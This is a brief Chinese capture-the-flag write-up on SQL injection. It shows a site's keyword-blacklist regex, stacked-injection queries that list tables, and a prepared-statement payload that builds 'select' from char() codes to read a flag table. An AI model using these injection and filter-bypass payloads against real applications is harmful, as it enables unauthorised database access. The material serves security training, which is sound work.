![image-20210824222436270](images\image-20210824222436270.png)

当尝试使用1' union select 1,2,3 时，页面提示了过滤规则：

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

使用堆叠注入：

发现了两个表：words 和 1919810931114514

![img](images\1417438-20190828203247445-874600076.jpg)

查看表结构，可以发现1919810931114514表中存在flag字段。

通过预编译绕过过滤规则：

```sql
SET @sql = concat(char(115,101,108,101,99,116), " * from `1919810931114514`");
PREPARE yuchuli from @sql;
EXECUTE yuchuli;
```

